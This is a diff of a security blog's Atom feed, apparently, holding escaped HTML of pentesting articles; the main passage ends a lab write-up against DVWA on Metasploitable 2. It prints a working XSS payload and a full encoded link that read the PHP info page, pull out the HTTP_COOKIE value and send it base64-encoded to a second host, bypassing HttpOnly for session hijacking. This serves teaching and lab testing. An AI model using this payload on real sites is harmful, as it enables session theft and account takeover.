class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reqListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;HTTP_COOKIE&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://192.168.240.129/?data=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()};&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and we click on &lt;em&gt;Submit&lt;/em&gt;, we can see that a GET request has been printed in the web server, like in the following screenshot&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/user-cookies-exfiltrated-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The value of the parameter &lt;em&gt;data&lt;/em&gt; is the &lt;em&gt;base64&lt;/em&gt; encoded form of the user cookies, so decoding it with the burpsuite decoder we can get the user cookies&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/user-cookies-exfiltrated-decoded-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, all the cookies has been displayed, so we have bypassed the &lt;em&gt;HttpOnly&lt;/em&gt; flag of the &lt;em&gt;PHPSESSID&lt;/em&gt; cookie. Therefore, anyone who clicks on the URL&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3Breq.onload%3DreqListener%3Bvar+url%3D%22http%3A%2F%2F192.168.240.128%2Fdvwa%2Fphpinfo%22%3Breq.withCredentials%3Dtrue%3Breq.open%28%22GET%22%2Curl%2Cfalse%29%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+req2%3Dnew+XMLHttpRequest%28%29%3Bconst+sess%3Dthis.responseText.substring%28this.responseText.indexOf%28%22HTTP_COOKIE%22%29%29%3Breq2.open%28%22GET%22%2C%22http%3A%2F%2F192.168.240.129%2F%3Fdata%3D%22%2Bbtoa%28sess%29%2Cfalse%29%3Breq2.send%28%29%7D%3B%3C%2Fscript%3E#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;will be sending us their cookies associated with &lt;em&gt;DVWA&lt;/em&gt;, including the session cookie and therefore we will have achieved a session hijacking.&lt;/p&gt;
+
+&lt;p&gt;Obviously this is a test environment and no one is going to click on that link except me, and even if someone did click on it nothing would happen because that IP address is a private IP address. But imagine this situation in a public website of an important company and an attacker sending a link like this using social engineering through Twitter, Linkedin, Facebook… and sending the user’s cookies to an own server. Do you still think that PHP info page disclosure is not an important vulnerability?&lt;/p&gt;
+
+&lt;div id=&quot;section-id-2-3&quot; /&gt;
+
+&lt;h2 id=&quot;23-important-notes&quot;&gt;2.3. Important notes&lt;/h2&gt;
+
+&lt;p&gt;Ok, we can exfiltrate some user cookies with the flag &lt;em&gt;HttpOnly&lt;/em&gt; set to &lt;em&gt;true&lt;/em&gt; but… Can we exfiltrate all the user cookies of the website? The answer is &lt;strong&gt;it depends&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Go to your browser and create some test cookies like in the following screenshot&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/test-cookies.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Don’t forget to set to &lt;em&gt;true&lt;/em&gt; the &lt;em&gt;HttpOnly&lt;/em&gt; flag and write the same paths of the screenshot below. If you go to the PHP info page you are going to see something like this&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/phpinfo-dvwa-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Not all the cookies are displayed but… Why? That’s because the &lt;em&gt;path&lt;/em&gt; value.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;PHP info page can be used to exfiltrate any user cookie whose path is a parent path of the path where the PHP info page is located. In other words, only cookies whose path is a prefixed path of the path in which the PHP info page is located can be exfiltrated.&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Taking into account that the PHP info page path is &lt;em&gt;/dvwa/phpinfo&lt;/em&gt; and applying this rule, we can now understand the above screenshot:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;cookie1&lt;/em&gt; appears because the path &lt;em&gt;/dvwa/phpinfo&lt;/em&gt; is a parent path of the PHP info page path (both are the same path).&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;cookie2&lt;/em&gt; appears because the path &lt;em&gt;/dvwa&lt;/em&gt; is a parent path of the PHP info page path.&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;cookie3&lt;/em&gt; appears because the path &lt;em&gt;/&lt;/em&gt; is a parent path of the PHP info page path.&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;cookie4&lt;/em&gt; doesn’t appear because the path &lt;em&gt;/dvwa/phpinfo/test&lt;/em&gt; is not a parent path of the PHP info page path.&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;cookie5&lt;/em&gt; doesn’t appear because the path &lt;em&gt;/test&lt;/em&gt; is not a parent path of the PHP info page path.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;There is another PHP info page in the root path of &lt;em&gt;Metasploitable 2&lt;/em&gt; as you can see in the following screenshot&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2022-11-12-pentesting-article-1/phpinfo-raiz-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The only cookie whose path is a parent path of the PHP info page path is &lt;em&gt;cookie3&lt;/em&gt;, that’s because is the only cookie displayed. You can see that the rule works.&lt;/p&gt;
+
+&lt;div id=&quot;section-id-3&quot; /&gt;
+
+&lt;h2 id=&quot;3-conclusions&quot;&gt;3. Conclusions&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;Metasploitable 2&lt;/em&gt; is a good environment for testing certain vulnerabilities and not having to create a vulnerable environment from scratch.&lt;/li&gt;
+  &lt;li&gt;Low severity vulnerabilities such as PHP info page disclosure are usually wrongly evaluated as “low severity” is often considered synonymous with “not important”.&lt;/li&gt;
+  &lt;li&gt;PHP info page disclosure can be used to bypass the &lt;em&gt;HttpOnly&lt;/em&gt; flag of some user cookies and exfiltrate them during an XSS exploitation. The only requirement is that the cookie path must be a parent path of the path where the PHP info page is located.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>HackCommander</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="Pentesting article" /><category term="web pentesting" /><category term="burpsuite" /><category term="base64" /><category term="metasploitable 2" /><category term="XSS" /><category term="exfiltrate cookies" /><category term="session hijacking" /><category term="PHP info page" /><category term="bypass" /><summary type="html">Pentesting article: how to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation.</summary></entry><entry><title type="html">Time-based SQL injection in a login form</title><link href="https://hackcommander.io/bug-bounty-2/" rel="alternate" type="text/html" title="Time-based SQL injection in a login form" /><published>2022-10-17T00:00:00+02:00</published><updated>2022-10-17T00:00:00+02:00</updated><id>https://hackcommander.io/bug-bounty-2</id><content type="html" xml:base="https://hackcommander.io/bug-bounty-2/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;#section-id-1&quot;&gt;1. Asset discovery&lt;/a&gt;&lt;/li&gt;
@@ -50,7 +327,7 @@
 
 &lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/1118898&quot;&gt;PHP info page disclosure report in HackerOne&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;PHP info page disclosure is considered a low criticality vulnerability but a vulnerability should not be underestimated by its scoring. For example, the PHP info page can be used to bypass the HttpOnly flag in the cookies during the exploitation of an XSS to get a session hijacking.&lt;/p&gt;
+&lt;p&gt;PHP info page disclosure is considered a low severity vulnerability but a vulnerability should not be underestimated by its scoring. For example, the PHP info page can be used to bypass the HttpOnly flag in the cookies during the exploitation of an XSS to get a session hijacking.&lt;/p&gt;
 
 &lt;p&gt;In this case, PHP info page disclosure has been crucial in finding this vulnerable asset because the HTTP service doesn’t have an related domain and naturally doesn’t have a TLS certificate to indicate that this asset belongs to the company in question. In fact, the company asked me how I had found this asset since they didn’t have it in their inventory.&lt;/p&gt;
 
@@ -102,7 +379,7 @@
 
 &lt;p&gt;This is not a CTF so, to discover the DBMS, it’s always best to examine the website well before fuzzing intensely.&lt;/p&gt;
 
-&lt;p&gt;Do you remember the PHP info page disclosure vulnerability? Yes, this page will be useful in this step too, this is the power of a low criticality vulnerability. As you can see in the following screenshot&lt;/p&gt;
+&lt;p&gt;Do you remember the PHP info page disclosure vulnerability? Yes, this page will be useful in this step too, this is the power of a low severity vulnerability. As you can see in the following screenshot&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/2022-10-17-bug-bounty-2/php-info-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -261,7 +538,7 @@
 
 &lt;ul&gt;
   &lt;li&gt;The reconnaisance step it’s very important, probably the most important one. It’s not a lost of time to use different OSINT tools, like LeakIX.&lt;/li&gt;
-  &lt;li&gt;Low criticality vulnerabilities should not be underestimated. Some of them, such as PHP info page disclosure, can lead to dangerous situations or make other vulnerabilities more critical.&lt;/li&gt;
+  &lt;li&gt;Low severity vulnerabilities should not be underestimated. Some of them, such as PHP info page disclosure, can lead to dangerous situations or make other vulnerabilities more critical.&lt;/li&gt;
   &lt;li&gt;Blind vulnerabilities, such as blind SQL injection, blind RCE… can be just as dangerous as non-blind vulnerabilities. Although it is not possible to obtain information directly from the response, it can be inferred through various techniques, such as producing delays based on a boolean condition.&lt;/li&gt;
 &lt;/ul&gt;</content><author><name>HackCommander</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="Bug Bounty" /><category term="web pentesting" /><category term="OSINT" /><category term="LeakIX" /><category term="burpsuite" /><category term="SQL injection" /><category term="MySQL" /><category term="information_schema" /><category term="sqlmap" /><category term="PHP info page" /><summary type="html">Partial disclosure of a bug bounty report: time-based SQL injection in login form.</summary></entry><entry><title type="html">Reflected XSS bypassing HTML tag removal sanitization</title><link href="https://hackcommander.io/bug-bounty-1/" rel="alternate" type="text/html" title="Reflected XSS bypassing HTML tag removal sanitization" /><published>2022-09-20T00:00:00+02:00</published><updated>2022-09-20T00:00:00+02:00</updated><id>https://hackcommander.io/bug-bounty-1</id><content type="html" xml:base="https://hackcommander.io/bug-bounty-1/">&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
 
